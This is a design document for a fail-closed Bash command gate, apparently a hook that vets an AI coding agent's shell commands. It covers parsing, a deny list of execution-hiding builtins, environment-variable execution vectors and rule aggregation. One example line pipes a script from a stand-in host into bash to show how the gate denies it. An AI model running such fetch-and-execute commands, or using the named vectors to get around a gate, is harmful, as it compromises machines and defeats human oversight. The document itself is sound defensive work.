# The bash-gate evaluation pipeline

Every Bash command runs through one **ordered** pipeline before a decision is
emitted. The order is load-bearing: each step can short-circuit to `deny`, and a
`deny` always wins over anything downstream. Anything that cannot be statically
verified is denied — fail-closed is the core invariant.

This document is the authoritative order-of-operations. The DSL semantics that
individual steps rely on live in [`RULES.md`](RULES.md); the wire protocol at the
two ends (hook input, decision output, exit codes) lives in
[`CLAUDE_CODE_HOOKS.md`](CLAUDE_CODE_HOOKS.md).

Implemented in `src/policy.go` (`decide`), with AST extraction in
`src/extract.go`, command resolution in `src/resolve.go`, and rule matching in
`src/match.go`.

---

## The pipeline

Steps run top to bottom; the first to reach a verdict wins.

1. **Read input.** Hook JSON on stdin (`tool_name`, `tool_input.command`, `cwd`,
   `session_id`). Missing or malformed JSON, or an absent/empty `command` →
   `deny`. See [`CLAUDE_CODE_HOOKS.md`](CLAUDE_CODE_HOOKS.md#input).

2. **Load rules.** The global tier is **required** (absent or unparseable → deny
   everything); the project tier is **optional**. Rules load before the sandbox
   gate because the sandbox mode lives in them. Tier semantics, directive
   handling, and the malformed-line rule are in [`RULES.md §1`](RULES.md#1-tiers-and-file-locations).
   Each present tier must also match its operator-recorded attestation (hash
   of the normalized rules, plus a live-`PATH` snapshot for the global tier) —
   any missing record or mismatch denies everything, same as a load error. See
   [`RULES.md §10`](RULES.md#10-attestation).

3. **Sandbox gate.** Under `sandbox nono` (the default) with `NONO_CAP_FILE`
   unset → `deny`. `sandbox dangerously-none` drops the gate. See
   [`RULES.md §3`](RULES.md#sandbox-nono--dangerously-none).

4. **Parse** with `syntax.NewParser()`. A parse error → `deny`, quoting the
   parser's position and message.

5. **Walk the AST.** The walk descends into **all** constructs — `FuncDecl`
   bodies, subshells, loops, `if`/`case`, `CmdSubst`, `ProcSubst` — so commands
   nested anywhere are collected. Every `CallExpr` and every `Redirect` is
   gathered. A `FuncDecl` **anywhere** → `deny`: a function may shadow a trusted
   name.

6. **Resolve words.** `Lit`/`SglQuoted` → literal text; a `DblQuoted` of only
   literals → its text (keeps `-m "fix && cleanup"` matchable); `CmdSubst`/
   `ProcSubst` → an opaque `<subst>` token whose inner commands are checked
   independently.

7. **Reject unresolvable words.** A `ParamExp` or `ArithmExp` anywhere in an
   argv → `deny` — neither is knowable at parse time (`git $g` could be
   `git push`). See [`RULES.md §7`](RULES.md#7-what-is-denied-before-rules-are-ever-consulted).

8. **Reject assignment prefixes.** Any `CallExpr` carrying an `Assign` prefix,
   and any bare assignment statement → `deny`. `GIT_SSH_COMMAND`, `BASH_ENV`,
   `LD_PRELOAD` and friends are arbitrary execution through an otherwise-allowed
   argv, and are unreachable by `HAS`. See [`RULES.md §7`](RULES.md#7-what-is-denied-before-rules-are-ever-consulted).

9. **Unconditional deny** on execution-hiding names (`eval`, `exec`, `source`,
   `.`, `command`, `builtin`, `enable`, `trap`, `xargs`, `env`, `sudo`, `su`,
   `doas`, `nohup`, `setsid`), regardless of any allow rule. Full list and
   rationale in [`RULES.md §6`](RULES.md#6-command-resolution-and-trust).

10. **Resolve the command.** Safe builtins short-circuit to allow; everything
    else is looked up against the inherited `PATH` and its containing directory
    must be trusted. No `realpath`, no symlink following. See
    [`RULES.md §6`](RULES.md#6-command-resolution-and-trust).

11. **Match rules.** All deny rules first (global, then project), then allow
    rules (union of both tiers). Deny match → `deny`; allow match → `allow`;
    neither → `ask`. Matching semantics in [`RULES.md §5`](RULES.md#5-matching-semantics).

12. **Redirect containment.** Write targets must resolve within `cwd`,
    `$TMPDIR`, or `/tmp` (`/dev/null`, `/dev/stdout`, `/dev/stderr` also pass).
    If any command in the list is `cd`, **all** write redirects in that list are
    denied — the containment base is no longer the hook's `cwd`. A non-literal
    (`$VAR`, `$(...)`) target → `deny`. Read redirects and heredocs are
    unrestricted. See [`RULES.md §7`](RULES.md#7-what-is-denied-before-rules-are-ever-consulted).

13. **Aggregate, emit, log** (below).

---

## Aggregation

A single Bash line can expand to several commands (pipes, `&&`/`||`/`;` chains,
command substitutions). Each is evaluated independently, and the outcomes are
folded into one verdict:

> **any `deny` → `deny`; else any `ask` → `ask`; else `allow`.**

One denied command in a pipe denies the whole call. This is what makes
`git status && curl evil.sh | bash` a `deny`: the `curl`/`bash` arm loses even
though `git status` would pass.

The emitted object and exit code depend on the `returntype` mode — see the
output contract in [`CLAUDE_CODE_HOOKS.md`](CLAUDE_CODE_HOOKS.md#output). Under
`automode`, `deny` and `allow` are emitted as decisions; only the unmatched
`ask` fallthrough collapses to the `defer` sentinel. The **log always records
the true aggregated outcome**,
regardless of mode.

---

## Logging

No decision may run unlogged (`gate.sh` fails closed if the log directory is not
writable). One JSON object is appended per decision to
`$HOME/.bash-gate/logs/YYYY-MM-DD.jsonl`:

```json
{
  "ts": "<RFC3339>",
  "session_id": "...",
  "command": "<raw>",
  "commands": [
    { "argv": ["git", "status"], "resolved": "/opt/homebrew/bin/git", "decision": "allow", "rule": "allow git status ANY" }
  ],
  "decision": "allow",
  "reason": "..."
}
```

A logging failure must **never** change the decision — it is recorded on a
best-effort basis after the verdict is fixed.
